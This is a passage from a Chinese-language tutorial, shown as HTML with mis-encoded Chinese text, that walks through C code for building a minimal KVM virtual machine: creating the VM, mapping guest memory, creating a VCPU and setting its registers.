class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_userspace_memory_region</span> <span class="hljs-title">mem</span>;</span> <span class="hljs-comment">// è™šæ‹Ÿæœºå†…å­˜åŒºåŸŸæè¿°ï¼Œç”¨äºå‘ŠçŸ¥å†…æ ¸è™šæ‹Ÿæœºå†…å­˜çš„ä½ç½®å’Œå¤§å°</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vcpu</span> *<span class="hljs-title">vcpu</span>[1];</span>                 <span class="hljs-comment">// è™šæ‹Ÿæœºå¤„ç†å™¨ï¼ˆVCPUï¼‰æ•°ç»„æŒ‡é’ˆï¼Œè¿™é‡ŒåªåŒ…å«ä¸€ä¸ªå…ƒç´ </span><br>&#125;;<br><br><span class="hljs-comment">// å®šä¹‰è™šæ‹Ÿå¤„ç†å™¨ç»“æ„ä½“</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vcpu</span> &#123;</span><br>    <span class="hljs-keyword">int</span> id;                               <span class="hljs-comment">// è™šæ‹Ÿå¤„ç†å™¨çš„å”¯ä¸€æ ‡è¯†ç¬¦ </span><br>    <span class="hljs-keyword">int</span> fd;                               <span class="hljs-comment">// è™šæ‹Ÿå¤„ç†å™¨æ–‡ä»¶æè¿°ç¬¦ï¼Œç”¨äºä¸å†…æ ¸é€šä¿¡</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_run</span> *<span class="hljs-title">run</span>;</span>                  <span class="hljs-comment">// æŒ‡å‘è™šæ‹ŸCPUè¿è¡ŒçŠ¶æ€çš„æŒ‡é’ˆï¼Œç”¨äºåœ¨ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ä¼ é€’çŠ¶æ€ä¿¡æ¯</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_sregs</span> <span class="hljs-title">sregs</span>;</span>               <span class="hljs-comment">// è™šæ‹ŸCPUç‰¹æ®Šå¯„å­˜å™¨çš„çŠ¶æ€</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_regs</span> <span class="hljs-title">regs</span>;</span>                 <span class="hljs-comment">// è™šæ‹ŸCPUé€šç”¨å¯„å­˜å™¨çš„çŠ¶æ€</span><br>&#125;;<br><br><span class="hljs-comment">// å…¨å±€å˜é‡ï¼Œè®°å½•æ‰“å¼€çš„/dev/kvmæ–‡ä»¶æè¿°ç¬¦ï¼Œç”¨äºä¸å†…æ ¸é€šä¿¡</span><br><span class="hljs-keyword">int</span> g_dev_fd;<br><br></code></pre></td></tr></table></figure><p>mainå‡½æ•°é¦–å…ˆå¯¹è¿™äº›å˜é‡è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œç„¶åè°ƒç”¨setup_vmå¼€å§‹ç»„è£…æœºå™¨äº†ã€‚ç»„è£…å¥½æœºå™¨åï¼Œè°ƒç”¨load_imageåŠ è½½Guestçš„é•œåƒåˆ°å†…å­˜ä¸­ï¼Œæœ€åè°ƒç”¨run_rmå¼€å§‹æ‰§è¡ŒGuestï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>    <span class="hljs-comment">// æ‰“å¼€KVMè®¾å¤‡æ–‡ä»¶ï¼Œè·å–æ–‡ä»¶æè¿°ç¬¦ç”¨äºä¸å†…æ ¸é€šä¿¡</span><br>    <span class="hljs-keyword">if</span> ((g_dev_fd = open(<span class="hljs-string">&quot;/dev/kvm&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to open KVM device.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// åˆ†é…å†…å­˜å¹¶åˆå§‹åŒ–è™šæ‹Ÿæœºç»“æ„ä½“</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span> *<span class="hljs-title">vm</span> =</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(struct vm));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vcpu</span> *<span class="hljs-title">vcpu</span> =</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(struct vcpu));<br>    vcpu-&gt;id = <span class="hljs-number">0</span>;<br>    vm-&gt;vcpu[<span class="hljs-number">0</span>] = vcpu;<br><br>    <span class="hljs-comment">// è®¾ç½®è™šæ‹Ÿæœºçš„å†…å­˜å¤§å°å’Œåˆå§‹åŒ–</span><br>    setup_vm(vm, <span class="hljs-number">64000000</span>);<br><br>    <span class="hljs-comment">// è½½å…¥è™šæ‹Ÿæœºçš„é•œåƒ</span><br>    load_image(vm);<br><br>    <span class="hljs-comment">// è¿è¡Œè™šæ‹Ÿæœº</span><br>    run_vm(vm);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="1-5-1-åˆ›å»ºè™šæ‹Ÿæœºå®ä¾‹"><a href="#1-5-1-åˆ›å»ºè™šæ‹Ÿæœºå®ä¾‹" class="headerlink" title="1.5.1 åˆ›å»ºè™šæ‹Ÿæœºå®ä¾‹"></a>1.5.1 åˆ›å»ºè™šæ‹Ÿæœºå®ä¾‹</h3><p>è¿™æ®µä»£ç ç”¨äºåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹ï¼Œé¦–å…ˆè°ƒç”¨ <code>ioctl</code> å‡½æ•°å‘é€ <code>KVM_CREATE_VM</code> å‘½ä»¤ç»™å†…æ ¸çš„ KVM å­ç³»ç»Ÿï¼Œä»è€Œåœ¨å†…æ ¸ä¸­åˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹ï¼Œå¹¶<strong>è¿”å›äº†è™šæ‹Ÿæœºå®ä¾‹çš„æ–‡ä»¶æè¿°ç¬¦</strong>ã€‚åœ¨åç»­çš„ä»£ç ä¸­ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æ¥æ“ä½œè¯¥è™šæ‹Ÿæœºå®ä¾‹</p><p>æœ€åˆåˆ›å»ºçš„è™šæ‹Ÿæœºåªæ˜¯ä¸€ä¸ªç©ºæœºç®±ï¼Œæ—¢æ²¡æœ‰å†…å­˜ï¼Œä¹Ÿæ²¡æœ‰å¤„ç†å™¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">// è®¾ç½®è™šæ‹Ÿæœºï¼ŒåŒ…æ‹¬åˆ†é…å†…å­˜ã€åˆå§‹åŒ–è™šæ‹Ÿæœºç»“æ„ç­‰</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setup_vm</span><span class="hljs-params">(struct vm *vm, <span class="hljs-keyword">int</span> ram_size)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// é€šè¿‡ioctlè°ƒç”¨KVM_CREATE_VMå‘½ä»¤åˆ›å»ºè™šæ‹Ÿæœºå®ä¾‹</span><br>    <span class="hljs-keyword">if</span> ((vm-&gt;vm_fd = ioctl(g_dev_fd, KVM_CREATE_VM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to create vm.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// ... å…¶ä»–è®¾ç½®è™šæ‹Ÿæœºçš„ä»£ç  ...</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="1-5-2-åˆ›å»ºå†…å­˜"><a href="#1-5-2-åˆ›å»ºå†…å­˜" class="headerlink" title="1.5.2 åˆ›å»ºå†…å­˜"></a>1.5.2 åˆ›å»ºå†…å­˜</h3><p>ç»„è£…æœºå™¨ï¼Œé¦–å…ˆæ˜¯å†…å­˜ï¼Œå°±åƒéœ€è¦åœ¨å†…å­˜æ§½ä¸Šæ’ä¸Šå†…å­˜æ¡ä¸€æ ·ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦ä¸ºæˆ‘ä»¬çš„è™šæ‹Ÿæœºå®‰è£…å†…å­˜ã€‚KVMä¸ºç”¨æˆ·ç©ºé—´å·¥å…·é…ç½®è™šæ‹Ÿæœºå†…å­˜å®šä¹‰çš„æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">commit <span class="hljs-number">6f</span>c138d2278078990f597cb1f62fde9e5b458f96<br>KVM: Support assigning userspace memory to the guest<br>linux.git/include/linux/kvm.h<br><br><span class="hljs-comment">// ç»“æ„ä½“å®šä¹‰ï¼Œç”¨äºé…ç½®è™šæ‹Ÿæœºå†…å­˜</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_userspace_memory_region</span> &#123;</span><br>    __u32 slot;                  <span class="hljs-comment">// å†…å­˜æ§½ç¼–å·</span><br>    __u32 flags;                 <span class="hljs-comment">// å†…å­˜çš„æ ‡å¿—å’Œå±æ€§</span><br>    __u64 guest_phys_addr;       <span class="hljs-comment">// å†…å­˜åœ¨è™šæ‹Ÿæœºç‰©ç†åœ°å€ç©ºé—´çš„èµ·å§‹åœ°å€</span><br>    __u64 memory_size;           <span class="hljs-comment">// å†…å­˜å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</span><br>    __u64 userspace_addr;        <span class="hljs-comment">// å†…å­˜åœ¨å®¿ä¸»æœºä¸­çš„èµ·å§‹åœ°å€</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªç»“æ„ä½“ï¼Œç”¨äºé…ç½®è™šæ‹Ÿæœºä¸­çš„å†…å­˜åŒºåŸŸã€‚å…¶ä¸­ï¼Œ<code>slot</code> å­—æ®µè¡¨ç¤ºå†…å­˜æ§½ç¼–å·ï¼Œç”¨äºæ ‡è¯†å†…å­˜çš„æ’æ§½ã€‚<code>flags</code> å­—æ®µè¡¨ç¤ºå†…å­˜çš„ç±»å‹å’Œå±æ€§ï¼Œå¦‚ <code>KVM_MEM_READONLY</code> è¡¨ç¤ºåªè¯»å†…å­˜ã€‚<code>guest_phys_addr</code> å­—æ®µæŒ‡å®šæ’å…¥çš„å†…å­˜åœ¨è™šæ‹Ÿæœºçš„ç‰©ç†åœ°å€ç©ºé—´ä¸­çš„èµ·å§‹åœ°å€ã€‚<code>memory_size</code> å­—æ®µè¡¨ç¤ºå†…å­˜çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚<code>userspace_addr</code> å­—æ®µè¡¨ç¤ºå®¿ä¸»æœºä¸­åˆ†é…çš„å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œç”¨äºåœ¨å®¿ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´è¿›è¡Œå†…å­˜æ˜ å°„ã€‚</p><p>ä¸‹é¢è¿™æ®µä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ä¸ºè™šæ‹Ÿæœºé…ç½®ç‰©ç†å†…å­˜ã€‚å®ƒé¦–å…ˆä½¿ç”¨ <code>mmap</code> åˆ†é…ä¸€æ®µæŒ‰ç…§é¡µé¢å°ºå¯¸å¯¹é½çš„å†…å­˜ä½œä¸ºè™šæ‹Ÿæœºçš„ç‰©ç†å†…å­˜ã€‚ç„¶åï¼Œé€šè¿‡ <code>KVM_SET_USER_MEMORY_REGION</code> APIï¼Œå°†è¿™å—å†…å­˜æ’å…¥è™šæ‹Ÿæœºçš„å†…å­˜æ§½ä¸­ã€‚åœ¨ <code>setup_vm</code> å‡½æ•°ä¸­ï¼Œå¡«å……äº†è™šæ‹Ÿæœºå†…å­˜é…ç½®ç»“æ„ä½“ <code>vm-&gt;mem</code> çš„å„ä¸ªå­—æ®µï¼ŒåŒ…æ‹¬å†…å­˜æ§½ç¼–å·ã€å†…å­˜å¤§å°ã€å†…å­˜åœ¨è™šæ‹Ÿæœºç‰©ç†åœ°å€ç©ºé—´çš„èµ·å§‹åœ°å€ä»¥åŠåœ¨å®¿ä¸»æœºä¸­çš„èµ·å§‹åœ°å€ã€‚æœ€åï¼Œé€šè¿‡ <code>ioctl</code> è°ƒç”¨å°†å†…å­˜é…ç½®ä¿¡æ¯ä¼ é€’ç»™ KVM å­ç³»ç»Ÿï¼Œå°†è¿™å—å†…å­˜æ’å…¥è™šæ‹Ÿæœºçš„0å·æ§½ï¼ˆä½¿ç”¨mmapåˆ†é…äº†ä¸€æ®µæŒ‰ç…§é¡µé¢å°ºå¯¸å¯¹é½çš„64MBçš„å†…å­˜ä½œä¸ºè™šæ‹Ÿæœºçš„ç‰©ç†å†…å­˜ã€‚ç„¶åé€šè¿‡KVMå­ç³»ç»Ÿä¸ºç”¨æˆ·ç©ºé—´é…ç½®è™šæ‹Ÿæœºå†…å­˜æä¾›çš„API KVM_SET_USER_MEMORY_REGIONï¼Œä¸ºè™šæ‹Ÿæœºåœ¨0å·æ§½ä¸Šæ’å…¥ä¸€æ¡å†…å­˜ï¼‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><br><span class="hljs-comment">// å‡†å¤‡è™šæ‹Ÿæœºçš„ç‰©ç†å†…å­˜</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setup_vm</span><span class="hljs-params">(struct vm *vm, <span class="hljs-keyword">int</span> ram_size)</span> </span>&#123;<br>    <span class="hljs-comment">// ... other setup ...</span><br><br>    vm-&gt;ram_size = ram_size;<br><br>    <span class="hljs-comment">// é€šè¿‡ mmap åˆ†é…é¡µé¢å¯¹é½çš„å†…å­˜ä½œä¸ºè™šæ‹Ÿæœºçš„ç‰©ç†å†…å­˜</span><br>    vm-&gt;ram_start = (__u64)mmap(<span class="hljs-literal">NULL</span>, vm-&gt;ram_size,<br>                                 PROT_READ | PROT_WRITE, MAP_PRIVATE |<br>                                 MAP_ANONYMOUS | MAP_NORESERVE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">void</span> *)vm-&gt;ram_start == MAP_FAILED) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to map memory for vm.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// é…ç½®è™šæ‹Ÿæœºå†…å­˜</span><br>    vm-&gt;mem.slot = <span class="hljs-number">0</span>;                       <span class="hljs-comment">// å†…å­˜æ§½ç¼–å·</span><br>    vm-&gt;mem.guest_phys_addr = <span class="hljs-number">0</span>;            <span class="hljs-comment">// å†…å­˜åœ¨è™šæ‹Ÿæœºç‰©ç†åœ°å€ç©ºé—´çš„èµ·å§‹åœ°å€</span><br>    vm-&gt;mem.memory_size = vm-&gt;ram_size;     <span class="hljs-comment">// å†…å­˜å¤§å°</span><br>    vm-&gt;mem.userspace_addr = vm-&gt;ram_start; <span class="hljs-comment">// å†…å­˜åœ¨å®¿ä¸»æœºä¸­çš„èµ·å§‹åœ°å€</span><br><br>    <span class="hljs-comment">// ä½¿ç”¨ KVM_SET_USER_MEMORY_REGION API å°†å†…å­˜æ’å…¥è™šæ‹Ÿæœºçš„0å·æ§½</span><br>    <span class="hljs-keyword">if</span> ((ioctl(vm-&gt;vm_fd, KVM_SET_USER_MEMORY_REGION, &amp;(vm-&gt;mem))) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to set memory for vm.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// ... other setup ...</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h3 id="1-5-3-åˆ›å»ºå¤„ç†å™¨"><a href="#1-5-3-åˆ›å»ºå¤„ç†å™¨" class="headerlink" title="1.5.3 åˆ›å»ºå¤„ç†å™¨"></a>1.5.3 åˆ›å»ºå¤„ç†å™¨</h3><p>KVMæ¨¡å—ä¸ºç”¨æˆ·ç©ºé—´æä¾›çš„APIä¸ºKVM_CREATE_VCPUï¼Œè¿™ä¸ªAPIæ¥æ”¶ä¸€ä¸ªå‚æ•°vcpu idï¼Œæœ¬è´¨ä¸Šæ˜¯lapci idï¼š</p><p>åœ¨ <code>setup_vm</code> å‡½æ•°ä¸­ï¼Œé¦–å…ˆè·å–è™šæ‹Ÿæœºä¸­çš„ç¬¬ä¸€ä¸ªå¤„ç†å™¨å®ä¾‹ï¼Œç„¶åé€šè¿‡ <code>KVM_CREATE_VCPU</code> å‘½ä»¤ï¼Œä¸ºè™šæ‹Ÿæœºåˆ›å»ºä¸€ä¸ªå¤„ç†å™¨ã€‚åˆ›å»ºåï¼Œå¤„ç†å™¨çš„æ–‡ä»¶æè¿°ç¬¦ <code>fd</code> å°†ç”¨äºä¸è¯¥å¤„ç†å™¨å®ä¾‹è¿›è¡Œäº¤äº’ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ä¸ºè™šæ‹Ÿæœºé…ç½®å¤„ç†å™¨</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setup_vm</span><span class="hljs-params">(struct vm *vm, <span class="hljs-keyword">int</span> ram_size)</span> </span>&#123;<br>    <span class="hljs-comment">// ... other setup ...</span><br><br>    <span class="hljs-comment">// è·å–è™šæ‹Ÿæœºä¸­çš„ç¬¬ä¸€ä¸ªå¤„ç†å™¨</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vcpu</span> *<span class="hljs-title">vcpu</span> =</span> vm-&gt;vcpu[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">// é€šè¿‡ KVM_CREATE_VCPU å‘½ä»¤ï¼Œä¸ºè™šæ‹Ÿæœºåˆ›å»ºä¸€ä¸ªå¤„ç†å™¨å®ä¾‹</span><br>    vcpu-&gt;fd = ioctl(vm-&gt;vm_fd, KVM_CREATE_VCPU, vcpu-&gt;id);<br>    <span class="hljs-keyword">if</span> (vcpu-&gt;fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to create cpu for vm.\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// ... other setup ...</span><br><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è™šæ‹Ÿå¤„ç†å™¨åˆ›å»ºå®Œæˆåï¼Œæˆ‘ä»¬éœ€è¦å‘ŠçŸ¥å¤„ç†å™¨ä»è™šæ‹Ÿæœºå†…å­˜çš„å“ªä¸ªä½ç½®å¼€å§‹æ‰§è¡ŒæŒ‡ä»¤ã€‚è¿™å¯ä»¥é€šè¿‡ç›´æ¥è®¾ç½®ä»£ç æ®µï¼ˆcsï¼‰å’ŒæŒ‡ä»¤æŒ‡é’ˆï¼ˆRIPï¼‰æ¥å®ç°ï¼Œè€Œä¸éœ€è¦æŒ‰ç…§ä¼ ç»Ÿçš„æ–¹å¼æ‰§è¡Œï¼Œå¦‚å¤„ç†å™¨é‡ç½®åä»åœ°å€0xFFFFFFF0å¼€å§‹æ‰§è¡Œã€‚åœ¨x86æ¶æ„ä¸­ï¼ŒKVMä¸ºè™šæ‹Ÿå¤„ç†å™¨çš„å¯„å­˜å™¨å®šä¹‰äº†ä¸¤ä¸ªç»“æ„ä½“ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯<code>struct kvm_sregs</code>ï¼Œè¯¥ç»“æ„ä½“è¢«ç§°ä¸ºç‰¹æ®Šå¯„å­˜å™¨ï¼ˆspecial registersï¼‰ï¼Œå®ƒåŒ…æ‹¬äº†å„ç§æ®µå¯„å­˜å™¨ã€æ§åˆ¶å¯„å­˜å™¨ç­‰ã€‚ä»£ç æ®µå¯„å­˜å™¨<code>cs</code> å°±åœ¨è¿™ä¸ªç»“æ„ä½“ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">linux.git/include/linux/kvm.h<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_sregs</span> &#123;</span><br> <span class="hljs-comment">/* in */</span><br>__u32 vcpu;<br>__u32 padding;<br><br><span class="hljs-comment">/* out (KVM_GET_SREGS) / in (KVM_SET_SREGS) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_segment</span> <span class="hljs-title">cs</span>, <span class="hljs-title">ds</span>, <span class="hljs-title">es</span>, <span class="hljs-title">fs</span>, <span class="hljs-title">gs</span>, <span class="hljs-title">ss</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_segment</span> <span class="hljs-title">tr</span>, <span class="hljs-title">ldt</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_dtable</span> <span class="hljs-title">gdt</span>, <span class="hljs-title">idt</span>;</span><br><br>__u64 cr0, cr2, cr3, cr4, cr8;<br>__u64 efer;<br>__u64 apic_base;<br>__u64 interrupt_bitmap[KVM_IRQ_BITMAP_SIZE(__u64)];<br>&#125;;<br></code></pre></td></tr></table></figure><p>é€šç”¨å¯„å­˜å™¨ã€æ ‡å¿—å¯„å­˜å™¨ï¼Œä»¥åŠå‰é¢åˆšåˆšæåˆ°çš„æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨<br>eipå®šä¹‰åœ¨å¦ä¸€ä¸ªç»“æ„ä½“kvm_regsä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>linux.git/include/linux/kvm.h<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_regs</span> &#123;</span><br><span class="hljs-comment">/* in */</span><br>__u32 vcpu;<br>__u32 padding;<br><span class="hljs-comment">/* out (KVM_GET_REGS) / in (KVM_SET_REGS) */</span><br>__u64 rax, rbx, rcx, rdx;<br>__u64 rsi, rdi, rsp, rbp;<br>__u64 r8, r9, r10, r11;<br>__u64 r12, r13, r14, r15;<br>__u64 rip, rflags;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œé¦–å…ˆè¿›å…¥16ä½å®æ¨¡å¼ï¼Œå¹¶åœ¨åç»­å°†GueståŠ è½½åˆ°æ®µåœ°å€ä¸º0x1000ã€åç§»åœ°å€ä¸º0çš„å†…å­˜ä½ç½®ã€‚ä¸ºäº†å®ç°è¿™ä¸ªç›®æ ‡ï¼Œä»£ç ä¸­ä½¿ç”¨äº†KVM APIæ¥è®¾ç½®è™šæ‹Ÿå¤„ç†å™¨çš„å¯„å­˜å™¨å€¼ï¼ŒåŒ…æ‹¬ä»£ç æ®µå¯„å­˜å™¨ï¼ˆcsï¼‰å’ŒæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆRIPï¼‰ï¼Œä»¥åŠä¸€äº›é™„åŠ æ“ä½œã€‚ä¸‹é¢æ˜¯å¯¹æ–‡å­—å’Œä»£ç çš„è§£é‡Šå’Œæ³¨é‡Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setup_vm</span><span class="hljs-params">(struct vm *vm, <span class="hljs-keyword">int</span> ram_size)</span> </span>&#123;<br>â€¦<br><span class="hljs-comment">// é€šè¿‡ ioctl è·å–è™šæ‹Ÿå¤„ç†å™¨çš„ç‰¹æ®Šå¯„å­˜å™¨ï¼ˆspecial registersï¼‰</span><br><span class="hljs-keyword">if</span> (ioctl(vcpu-&gt;fd, KVM_GET_SREGS, &amp;(vcpu-&gt;sregs)) &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to get sregs.\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-comment">// è®¾ç½®ä»£ç æ®µå¯„å­˜å™¨ cs</span><br>vcpu-&gt;sregs.cs.selector = <span class="hljs-number">0x1000</span>;         <span class="hljs-comment">// è®¾ç½®ä»£ç æ®µé€‰æ‹©å­ä¸º0x1000</span><br>vcpu-&gt;sregs.cs.base = <span class="hljs-number">0x1000</span> &lt;&lt; <span class="hljs-number">4</span>;       <span class="hljs-comment">// è®¾ç½®ä»£ç æ®µåŸºåœ°å€ä¸º0x1000 &lt;&lt; 4 = 0x10000</span><br><br><span class="hljs-comment">// å°†æ›´æ–°åçš„ sregs é‡æ–°è®¾ç½®ç»™è™šæ‹Ÿå¤„ç†å™¨</span><br><span 